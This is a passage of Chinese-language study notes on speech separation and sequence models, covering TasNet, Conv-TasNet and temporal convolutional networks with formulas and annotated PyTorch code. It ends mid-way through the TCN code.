shortcuts可以直接使用，如果不同的话有几种选择:一种是增加维度补0，还有一种就是上述的添加线性投影。</p><p>作者在每一个卷积层后都添加了批量归一化操作，使用256的小批量size进行随机梯度下降，学习率从0.1开始，每次误差停滞的时候除以十。模型经过60*10^4次的迭代训练，并且不使用dropout方法(之前整理过)</p><p><img src="https://s2.loli.net/2024/08/16/yL5aC4q7hBDYWSR.png" alt="image-20240816201241952"></p><h2 id="Trainsformer-Attention-Is-All-You-Need"><a href="#Trainsformer-Attention-Is-All-You-Need" class="headerlink" title="Trainsformer(Attention Is All You Need)"></a>Trainsformer(Attention Is All You Need)</h2><h2 id="TASNET"><a href="#TASNET" class="headerlink" title="TASNET"></a>TASNET</h2><h3 id="论文阅读-1"><a href="#论文阅读-1" class="headerlink" title="论文阅读"></a>论文阅读</h3><p>这里主要记录问题建模与网络设计，实验部分之后有需要再总结</p><p>作者在引言中提到，大多数方法想办法为每个多信号的时频表示构造一个mask，但对于语音分离来说或许并不是一个最优的方法。并且，时频上的分解会造成诸多问题(信号相位和幅度的解耦等)。作者采用了时域音频分离网络进行处理。</p><p>作者认为在时域上的分离问题可以建模成如下，我们有$C$个声源$s_1(t),\dots,s_c(t)$ 我们能够获取的是其混合</p><script type="math/tex; mode=display">x(t) = \sum_{i=1} ^C s_i(t)</script><p>我们可以将这些音频样本分为$K$段，每段长为$L$，即$\mathbf{x_k} \in \mathbb{R}^{1\times L}$ ,所以可以表示为</p><script type="math/tex; mode=display">\mathbf{x}_k = x(t)\\\mathbf{s}_{i,k} = s_i(t)</script><p>其中$t\in [kL,(k+1)L ),k = 1,2,\dots,K$ 。这里为了表示$\mathbf{x}$，我们可以将其建模为若干基向量的线性组合形式，即</p><script type="math/tex; mode=display">\mathbf{x} = \mathbf{wB}\\\mathbf{s_i} = \mathbf{d_iB}</script><p>其中$\mathbf{B}$由$N$个长度为$L$的向量$\mathbf{b_1},\dots,\mathbf{b_N}$组成</p><p>其中有</p><script type="math/tex; mode=display">\mathbf{w} = \sum_{i=1}^{C}\mathbf{d_i}</script><p>如果我们要对其进行分离，显然给其运算一个掩码MASK即可，即令</p><script type="math/tex; mode=display">\mathbf{w} \odot \mathbf{m_i} = \mathbf{d_i}</script><p>整个结构分为三个部分，即<code>encoder</code>,<code>separation</code>以及<code>decoder</code>部分，示意如下</p><p><img src="https://s2.loli.net/2024/08/27/UaDRZcTIC1qV4jF.png" alt="image-20240827163301465"></p><p><code>encoder</code>部分所做的事是从$\mathbf{x}$中提取基向量，即</p><script type="math/tex; mode=display">\mathbf{w_k} = ReLU(\mathbf{x_k} {\circledast}\mathbf{U}) \odot\sigma(\mathbf{x_k} {\circledast}\mathbf{V}) ,k = 1,2,\dots,K</script><p>其中${\circledast}$代表卷积运算，$\mathbf{x}_k \in \mathbb{R}^{1\times L},\mathbf{U} \in \mathbb{R}^{N\times L},\mathbf{V} \in \mathbb{R}^{N\times L}$ ，个人认为这个$\mathbf{U},\mathbf{V}$ 充当了类似卷积核的东西，从$\mathbf{x}_k$中提取特征从而得到基向量$\mathbf{w}_k$ </p><p>作者提到了 <code>empirically it performs significantly better than using only ReLU or Sigmoid in our system</code> ,这也是为什么一个采用了ReLU,一个采用了sigmod。不过只是说其empirically,并没有严格论述为什么这样会better。</p><p>因为考虑时序性以及记忆性的因素，分离部分采用的是LSTM网络，输入的是$K$段向量$\mathbf{w}_1,\dots,\mathbf{w}_K \in \mathbb R^{1\times N}$,而输出的即第$i$段对应掩码$\mathbf{m}_{i,1},\dots,\mathbf{m}_{i,K} \in \mathbb R^{1\times N}$</p><p>需要注意的是，其输入<script type="math/tex">\mathbf{w_i}</script>需要经过正则化，即</p><script type="math/tex; mode=display">\hat{\mathbf{w}_k} =\frac{\mathbf{g}}{\sigma}\otimes(\mathbf{w}_k-\mu) +\mathbf{b}\\\mu = \frac{1}{N}\sum_{j=1} ^{N} \mathbf{w}_{k,j} ,\sigma = \sqrt{\frac{1}{N}\sum_{j=1}^N (\mathbf{w}_{k,j}-\mu)^2}</script><p>作者正则化参考的是这一篇文章<code>Jimmy Lei Ba, Jamie Ryan Kiros, and Geoffrey E Hinton, “Layer normalization,” arXiv preprint arXiv:1607.06450, 2016.</code>。如果没猜错的话应该是参考这个式子</p><p><img src="https://s2.loli.net/2024/08/27/OxiSV1rFeN9dDCo.png" alt="image-20240827165802860"></p><p>但是作者采用的是$\otimes$这个符号，不知道是想表达的是克罗内克积还是哈达玛积，笔者猜测应该是后者。笔者打算看一下<code>Layer normalization</code>这篇文章。</p><p>对于decoder模块，当我们经过separation模块从$\hat{\mathbf{W}}$得到$M_i = [\mathbf{m}_{i,1},\dots,\mathbf{m}_{i,K}] \in \mathbb{R}^{K\times N}$ 之后，我们就能计算</p><script type="math/tex; mode=display">\mathbf{D}_i = \mathbf{W}\odot\mathbf{M}_i</script><p>注意这里作用的是未经正则化的$\mathbf{W}$ </p><p>进而根据$\mathbf{B}$获取原始声源</p><script type="math/tex; mode=display">\mathbf{S}_i = \mathbf{D}_i\mathbf{B}</script><p>损失函数使用的是SI-SNR，公式如下</p><script type="math/tex; mode=display">s_{target} = \frac{\langle \hat{s},s \rangle s}{ \Vert s\Vert ^2} \\e_{noise} = \hat{s} - s_{target} \\SISNR = 10\log_{10}\frac{\Vert s_{target} \Vert ^2}{\Vert e_{noise} \Vert ^2}</script><p>其中$\hat{s}$是评估信号，$s$是纯净信号，$\langle \hat{s} ,s\rangle$代表了元素成绩再求和，$\Vert s \Vert ^2$代表了L2范数</p><p>应该参考了这一篇paper，回头看看</p><p>2019_<a href="https://ieeexplore.ieee.org/abstract/document/8683855/">SDR–half-baked or well done?</a></p><h3 id="代码阅读"><a href="#代码阅读" class="headerlink" title="代码阅读"></a>代码阅读</h3><p>前文主要针对的是理论分析，下面记录一下代码实现部分</p><p>主要针对的是其模型构建以及训练过程</p><p>关于模型构建:</p><p>主要集中在<code>tasnet.py</code>中 ，和论文中一样，在<code>TasNet</code>类的<code>__init__</code>方法分别声明了类成员<code>encoder</code>，<code>separator</code>以及<code>decoder</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TasNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, L, N, hidden_size, num_layers,</span></span></span><br><span class="line"><span class="function"><span class="params">                 bidirectional=True, nspk=<span class="number">2</span></span>):</span></span><br><span class="line">        super(TasNet, self).__init__()</span><br><span class="line">        <span class="comment"># hyper-parameter</span></span><br><span class="line">        self.L, self.N = L, N</span><br><span class="line">        self.hidden_size, self.num_layers = hidden_size, num_layers</span><br><span class="line">        self.bidirectional = bidirectional</span><br><span class="line">        self.nspk = nspk</span><br><span class="line">        <span class="comment"># Components</span></span><br><span class="line">        self.encoder = Encoder(L, N)</span><br><span class="line">        self.separator = Separator(N, hidden_size, num_layers,</span><br><span class="line">                                   bidirectional=bidirectional, nspk=nspk)</span><br><span class="line">        self.decoder = Decoder(N, L)</span><br></pre></td></tr></table></figure><p>同时定义了前向传播函数,这里就是使用了<code>encoder</code>对<code>mixture</code>进行编码，然后借由<code>separator</code>获取<code>mask</code>，最后作用于<code>mixture_w</code>获得<code>source</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, mixture, mixture_lengths</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        mixture: [B, K, L]</span></span><br><span class="line"><span class="string">        mixture_lengths: [B]</span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        est_source: [B, nspk, K, L]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mixture_w, norm_coef = self.encoder(mixture)</span><br><span class="line">    est_mask = self.separator(mixture_w, mixture_lengths)</span><br><span class="line">    est_source = self.decoder(mixture_w, est_mask, norm_coef)</span><br><span class="line">    <span class="keyword">return</span> est_source</span><br></pre></td></tr></table></figure><p>模型主要就三个部件，<code>Encoder</code>，<code>Separator</code>以及<code>Decoder</code></p><p><code>Encoder</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Encoder</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Estimation of the nonnegative mixture weight by a 1-D gated conv layer.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, L, N</span>):</span></span><br><span class="line">        super(Encoder, self).__init__()</span><br><span class="line">        <span class="comment"># hyper-parameter</span></span><br><span class="line">        self.L = L</span><br><span class="line">        self.N = N</span><br><span class="line">        <span class="comment"># Components</span></span><br><span class="line">        <span class="comment"># Maybe we can impl 1-D conv by nn.Linear()?</span></span><br><span class="line">        self.conv1d_U = nn.Conv1d(L, N, kernel_size=<span class="number">1</span>, stride=<span class="number">1</span>, bias=<span class="literal">False</span>) <span class="comment">#论文中的一维卷积U,V,kernel_size=1，每次卷积卷1*L,卷N次生成的N*1</span></span><br><span class="line">        self.conv1d_V = nn.Conv1d(L, N, kernel_size=<span class="number">1</span>, stride=<span class="number">1</span>, bias=<span class="literal">False</span>) <span class="comment"># 同理</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, mixture</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            mixture: [B, K, L] #这里大小B*K*L的B应该是每个batch大小</span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            mixture_w: [B, K, N]</span></span><br><span class="line"><span class="string">            norm_coef: [B, K, 1]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        B, K, L = mixture.size()</span><br><span class="line">        <span class="comment"># L2 Norm along L axis</span></span><br><span class="line">        norm_coef = torch.norm(mixture, p=<span class="number">2</span>, dim=<span class="number">2</span>, keepdim=<span class="literal">True</span>)  <span class="comment"># B x K x 1 计算L上的L2范数</span></span><br><span class="line">        norm_mixture = mixture / (norm_coef + EPS) <span class="comment"># B x K x L 除以范数，进行归一化，同时EPS防止除0</span></span><br><span class="line">        <span class="comment"># 1-D gated conv</span></span><br><span class="line">        norm_mixture = torch.unsqueeze(norm_mixture.view(<span class="number">-1</span>, L), <span class="number">2</span>)  <span class="comment"># B*K x L x 1 维度进行调整，感觉就是调整为若干L x 1的向量组合，方便卷积，最后再重整回来</span></span><br><span class="line">        conv = F.relu(self.conv1d_U(norm_mixture))         <span class="comment"># B*K x N x 1 #一个过ReLU函数</span></span><br><span class="line">        gate = torch.sigmoid(self.conv1d_V(norm_mixture))  <span class="comment"># B*K x N x 1 #一个过sigmoid函数</span></span><br><span class="line">        mixture_w = conv * gate  <span class="comment"># B*K x N x 1</span></span><br><span class="line">        mixture_w = mixture_w.view(B, K, self.N) <span class="comment"># B x K x N</span></span><br><span class="line">        <span class="keyword">return</span> mixture_w, norm_coef</span><br></pre></td></tr></table></figure><p>对于分离的模块，其代码及注释如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Separator</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Estimation of source masks</span></span><br><span class="line"><span class="string">    TODO: 1. normlization described in paper </span></span><br><span class="line"><span class="string">          2. LSTM with skip connection</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, N, hidden_size, num_layers, bidirectional=True, nspk=<span class="number">2</span></span>):</span></span><br><span class="line">        super(Separator, self).__init__()</span><br><span class="line">        <span class="comment"># hyper-parameter</span></span><br><span class="line">        self.N = N</span><br><span class="line">        self.hidden_size = hidden_size <span class="comment">#隐含层维度</span></span><br><span class="line">        self.num_layers = num_layers <span class="comment">#一般是单层LSTM</span></span><br><span class="line">        self.bidirectional = bidirectional</span><br><span class="line">        self.nspk = nspk <span class="comment">#应该是说话人数</span></span><br><span class="line">        <span class="comment"># Components</span></span><br><span class="line">        self.layer_norm = nn.LayerNorm(N) <span class="comment">#标准化，作者应该用了这个来代替paper里面的normlization</span></span><br><span class="line">        self.rnn = nn.LSTM(N, hidden_size, num_layers,</span><br><span class="line">                           batch_first=<span class="literal">True</span>, <span class="comment">#第一个维度是batch_size</span></span><br><span class="line">                           bidirectional=bidirectional) <span class="comment">#双向LSTM</span></span><br><span class="line">        fc_in_dim = hidden_size * <span class="number">2</span> <span class="keyword">if</span> bidirectional <span class="keyword">else</span> hidden_size</span><br><span class="line">        self.fc = nn.Linear(fc_in_dim, nspk * N) <span class="comment">#全连接层</span></span><br><span class="line">        <span class="comment">### To impl LSTM with skip connection</span></span><br><span class="line">        <span class="comment"># self.rnn = nn.ModuleList()</span></span><br><span class="line">        <span class="comment"># self.rnn += [nn.LSTM(N, hidden_size, num_layers=1,</span></span><br><span class="line">        <span class="comment">#                      batch_first=True,</span></span><br><span class="line">        <span class="comment">#                      bidirectional=bidirectional)]</span></span><br><span class="line">        <span class="comment"># for l in range(1, num_layers):</span></span><br><span class="line">        <span class="comment">#     self.rnn += [nn.LSTM(hidden_size, hidden_size, num_layers=1,</span></span><br><span class="line">        <span class="comment">#                          batch_first=True,</span></span><br><span class="line">        <span class="comment">#                          bidirectional=bidirectional)]</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, mixture_w, mixture_lengths</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            mixture_w: [B, K, N], padded</span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            est_mask: [B, K, nspk, N]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        B, K, N = mixture_w.size()</span><br><span class="line">        <span class="comment"># layer norm</span></span><br><span class="line">        norm_mixture_w = self.layer_norm(mixture_w) <span class="comment">#首先经过normlization</span></span><br><span class="line">        <span class="comment"># LSTM</span></span><br><span class="line">        total_length = norm_mixture_w.size(<span class="number">1</span>)  <span class="comment"># get the max sequence length</span></span><br><span class="line">        packed_input = pack_padded_sequence(norm_mixture_w, mixture_lengths,</span><br><span class="line">                                            batch_first=<span class="literal">True</span>)<span class="comment"># 压紧数据</span></span><br><span class="line">        packed_output, hidden = self.rnn(packed_input)<span class="comment">#经过RNN，这里就是init定义的LSTM</span></span><br><span class="line">        output, _ = pad_packed_sequence(packed_output, <span class="comment">#解压数据</span></span><br><span class="line">                                        batch_first=<span class="literal">True</span>,</span><br><span class="line">                                        total_length=total_length)</span><br><span class="line">        <span class="comment"># fc</span></span><br><span class="line">        score = self.fc(output)  <span class="comment"># B x K x nspk*N #经过全连接层，将得到的特征空间映射样本标记空间</span></span><br><span class="line">        score = score.view(B, K, self.nspk, N)</span><br><span class="line">        <span class="comment"># softmax</span></span><br><span class="line">        est_mask = F.softmax(score, dim=<span class="number">2</span>) <span class="comment">#过一个softmax</span></span><br><span class="line">        <span class="keyword">return</span> est_mask</span><br></pre></td></tr></table></figure><p><code>Decoder</code>类如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Decoder</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, N, L</span>):</span></span><br><span class="line">        super(Decoder, self).__init__()</span><br><span class="line">        <span class="comment"># hyper-parameter</span></span><br><span class="line">        self.N, self.L = N, L</span><br><span class="line">        <span class="comment"># Components</span></span><br><span class="line">        self.basis_signals = nn.Linear(N, L, bias=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, mixture_w, est_mask, norm_coef</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            mixture_w: [B, K, N]</span></span><br><span class="line"><span class="string">            est_mask: [B, K, nspk, N]</span></span><br><span class="line"><span class="string">            norm_coef: [B, K, 1]</span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            est_source: [B, nspk, K, L]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># D = W * M</span></span><br><span class="line">        source_w = torch.unsqueeze(mixture_w, <span class="number">2</span>) * est_mask  <span class="comment"># B x K x nspk x N</span></span><br><span class="line">        <span class="comment"># S = DB</span></span><br><span class="line">        est_source = self.basis_signals(source_w)  <span class="comment"># B x K x nspk x L</span></span><br><span class="line">        <span class="comment"># reverse L2 norm</span></span><br><span class="line">        norm_coef = torch.unsqueeze(norm_coef, <span class="number">2</span>)  <span class="comment"># B x K x 1 x1</span></span><br><span class="line">        est_source = est_source * norm_coef  <span class="comment"># B x K x nspk x L</span></span><br><span class="line">        est_source = est_source.permute((<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>)).contiguous() <span class="comment"># B x nspk x K x L</span></span><br><span class="line">        <span class="keyword">return</span> est_source</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后main函数主要是测试用</p><h2 id="Conv-TasNet"><a href="#Conv-TasNet" class="headerlink" title="Conv-TasNet"></a>Conv-TasNet</h2><p>还是TasNet那个作者写的，主要区别就是不采用LSTM了，而是用了类似TCN的卷积的结构(TCN下面有整理)。作者提到，在原始的TasNet中使用LSTM限制了适用性。首先是在编码器中选择较小的内核大小(即语音帧长)，增加了编码器输出的长度，这使得LSTM的训练难以管理。其次，深度LSTM网络中大量的参数显著增加了其计算成本。这样难以在一些小型的穿戴听力设备中使用。第三则是由LSTM网络的长时间依赖性引起的，这常常导致分离精度不一致，例如，当改变混合的起始点时。</p><p>还是和Tasnet差不多，我们的建模就是从混合波形$x(t) \in \mathbb{R}^{1\times T}$中估计出若干源信号 $s_i(t) \in \mathbb{R} ^{1\times T}$</p><script type="math/tex; mode=display">x(t) = \sum_{i=1} ^C s_i(t)</script><p>还是一样的把输入分为长度为$L$的帧，即$x_k \in \mathbb{R} ^{1\times L}$,编码模块采用了一维卷积运算</p><script type="math/tex; mode=display">w = \mathcal{H}(xU^{T})</script><p>其中$U \in \mathbb{R}^{N\times L}$包含了$N$个向量(编码基函数)，$H$是可选的激活函数,而解码器可以表示为</p><script type="math/tex; mode=display">\hat{x} = wV</script><p>其中$\hat{x} \in \mathbb{R}^{1\times L}$是重建的$x$，而$V \in \mathbb{R} ^{N\times L}$ 是解码器的基函数</p><p>而分离的过程也和TasNet一样，将mask应用在混合表示$w$上，最后乘以解码器</p><script type="math/tex; mode=display">d_i = w\odot m_i \\\hat{s_i} = d_iV</script><p>主要作更改的是分离模块，没有采用LSTM，而是一种类似于TCN的设计</p><p><img src="https://s2.loli.net/2024/08/28/48V9RuSnFexX2hw.png" alt="image-20240828211427094"></p><p>同时，作者使用深度可分离卷积$S_conv(<em>)$来代替标准卷积,深度可分离卷积算子由两个连续运算(depthwise convolution,即$D_conv(</em>)$)以及(pointwise convolution，即$1\times 1-conv(*)$)组成 </p><script type="math/tex; mode=display">S\_conv(\mathbf{Y},\mathbf{K},\mathbf{L}) = D\_conv(\mathbf{Y},\mathbf{K})\circledast\mathbf{L} \\D\_conv(\mathbf{Y},\mathbf{K}) = concat(\mathbf{y}_j\circledast\mathbf{k}_j),j=1,\dots,N</script><p>其中$\mathbf{Y} \in \R ^{G\times M}$为输入，$\mathbf{K} \in \R ^{G\times P}$是大小为$P$的卷积核，$\mathbf{y}_j \in \R^{1\times M}$以及$\mathbf{k}_j \in \R^{1\times P}$为矩阵$\mathbf{Y}$以及$\mathbf{K}$的行，$\mathbf{L}$为大小为1的卷积核，$\circledast$代表卷积运算。其一共有$G\times P+G\times H$个参数，而标准卷积$\hat{\mathbf{K}}\in \R ^{G\times H\times P}$则有$G\times H\times P$个参数，其模型大小显著降低</p><h2 id="TCN的想法"><a href="#TCN的想法" class="headerlink" title="TCN的想法"></a>TCN的想法</h2><p>RNN在序列问题上有良好表现，但其并不能并行运算，只能一次处理一个时间步长。而TCN借鉴了CNN的模型，以其为基础，提出了下列改进:<code>适用序列模型：因果卷积</code>,<code>记忆历史：空洞卷积/膨胀卷积</code>以及<code>残差模块</code></p><p>首先是因果卷积。对于序列问题其可转化为根据$x_1,x_2,\dots,x_t$预测$y_1,y_2,\dots,y_t$。给定滤波器$F = (f_1,f_2,\dots,f_K)$以及序列$X = (x_1,x_2,\dots,x_T)$，则其在$x_t$处的因果卷积为</p><script type="math/tex; mode=display">(F *X)_{(x_t)}  = \sum_{k=1} ^Kf_kx_{t-K-k}</script><p>示意如下图所示</p><p><img src="https://s2.loli.net/2024/08/28/Uy693GSHl1VW5c2.png" alt="image-20240828155529170"></p><p>对于上一层时刻$t$,其只依赖下一层时刻$t$及其之前的值，其不能看到未来的数据，是一种单向的结构。并且它没有循环连接的结构，所以训练起来比循环神经网络(RNN)更快。</p><p>但是这里有一个问题，如果我们想要某个output(比如$y_t$)尽量获取多一点之前序列的信息，就只能尽可能地去叠加隐藏层。在这个图中，一个输出层期望采集输入层的5个时间步，则需要3个隐藏层。如果在想扩展采集更早的时间步，则只能再叠隐藏层。</p><p>所以引入了<code>膨胀卷积/空洞卷积(Dilated Convolution)</code>的想法。空洞卷积意味着我们在卷积的过程中可能会隔几个取样一次，示意如下</p><p><img src="https://s2.loli.net/2024/08/28/ra2sS5tcbuIgJzd.png" alt="image-20240828160850411"></p><p>其每一层的$d$就代表了<code>Dilatation rate</code>，通俗来说就是到底隔多少个取样一次。其在$x_t$处的Dilatation rate = $d$的空洞卷积可表示为</p><script type="math/tex; mode=display">(F*_dX)_{(x_t)} = \sum_{k=1} ^K f_kx_{t-(K-k)d}</script><p>一般而言随着层数增加，$d$以2的指数级增长，比如上图采取的就是1,2,4(很好理解，因为这样确保了最上面的output $\hat{y_k}$能够最快且最满地提取到input的信息，也就是说，这样使得最上层$\hat{y_t}$所能提取的最长的input信息$L$M满足$L\sim 2^h$) </p><p>最后是残差连接</p><p>通常残差连接可以描述为,对于我们设置的一系列变换$\mathcal{F}$，可以通过残差连接将其表示为</p><script type="math/tex; mode=display">o = Activation(\mathbf{x}+\mathcal{F}(\mathbf{x}))</script><p>一个TCN的残差block如图所示</p><p><img src="https://s2.loli.net/2024/08/28/H8zL5Dkef4NqpSW.png" alt="image-20240828162907988"></p><p>对于输入$\hat{\mathbf{z}}^{(i-1)}$，一方面其经过左边变换(dilated causal conv-&gt;weightNorm-&gt;ReLU-&gt;Dropout等一系列)，另一方面经过1x1卷积(或者不经过)和左边的输出进行连接</p><p><img src="https://s2.loli.net/2024/08/28/maqiYs5nTNXRU46.png" alt="image-20240828163345788"></p><p>综上，使用pytorch实现TCN的代码如下所示(作者<a href="https://github.com/locuslab/TCN/blob/master/TCN/tcn.py">github.com</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一个1-D卷积层的截断模块，主要用于去除sequence右边的padding</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crop1d</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, crop_size</span>):</span></span><br><span class="line">        super(Crop1d, self).__init__()</span><br><span class="line">        self.crop_size = crop_size  <span class="comment"># 输入需要被裁剪的序列长度</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, sequence</span>):</span></span><br><span class="line">        <span class="keyword">return</span> sequence[:, :, :-self.crop_size].contiguous()  <span class="comment"># 裁剪输入，返回截断后的序列</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 定义用于时间序列预测的1-D卷积神经网络</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TemporalBlock</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, n_inputs, n_outputs, kernel_size, stride, dilation, padding, dropout=<span class="number">0.2</span></span>):</span></span><br><span class="line">        super(TemporalBlock, self).__init__()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 定义两个卷积层，对权重进行规范化</span></span><br><span class="line">        self.conv1 = weight_norm(nn.Conv1d(n_inputs, n_outputs, kernel_size,</span><br><span class="line">                                           stride=stride, padding=padding, dilation=dilation))  <span 